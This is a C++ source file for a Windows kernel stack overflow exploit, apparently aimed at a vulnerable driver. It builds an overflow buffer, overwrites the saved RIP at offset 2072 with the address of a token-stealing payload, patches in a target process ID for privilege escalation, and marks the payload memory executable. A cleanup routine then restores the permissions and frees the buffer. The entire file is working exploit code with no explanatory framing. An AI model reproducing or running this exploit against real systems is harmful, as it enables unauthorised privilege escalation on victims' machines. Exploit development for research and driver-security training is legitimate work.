
#include "payload_stack_overflow.h"

namespace payload_stack_overflow {
	
	bool PayloadStackOverFlow :: init() {
		// 0 Check the process ID
		// 1 Allocate buffer
		// 2 fill buffer with 0x49 value
		// 3 set RIP offset as a address of payload 
		// 4 set the target process ID to elevate privileges
		// 5 grant EXECUTE permission to allow payload to be executed

		auto b_res = false;
		if (payloads :: process_is_running(_targetPid)) {
			if (NULL != (_buffer = (byte*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, _bufferSz)) ) {
				memset(_buffer, /*0x49*/ (int)'I', _bufferSz);

				byte *func_begin = payloads::retrive_func_addr_from_jmp(TokenStealingPayloadStackOverflow);

				const auto rip_offset = 2072; // = RIP - register				// [Option] we can also control RSP register
				ULONG* payload_addr = (ULONG*)(_buffer + rip_offset);			//const DWORD rip_offset = 2080; // = RSP - register
				*(__int64*)payload_addr = (__int64)func_begin;  //	(__int64)&TokenStealingPayloadStackOverflow;	//memset(input_buffer + 2080, 0x42, 8);

				if (payloads::set_pid_to_func(_targetPid, func_begin) &&
					payloads::set_memory_permission(PAGE_EXECUTE_READ, func_begin)) {
					b_res = true;
				}
			}
		}
		else {
			cout << "There is no active process with the UniqueProcessId = " << _targetPid << endl;
		}
		return b_res;
	}

	void PayloadStackOverFlow :: clear() {
		auto b_res = false;
		// Restore permissions and free memory
		if (_buffer) {
			byte *func_begin = payloads::retrive_func_addr_from_jmp(TokenStealingPayloadStackOverflow);
			if (func_begin) {
				// Restore default 'PID' value in the payload
				if (payloads::set_memory_permission(PAGE_READWRITE, func_begin) &&
					payloads::set_pid_to_func(payloads::g_dwDefaultPid, func_begin)) {
					b_res = true;
				}
			}
			HeapFree(GetProcessHeap(), 0, _buffer);
		}
	}

}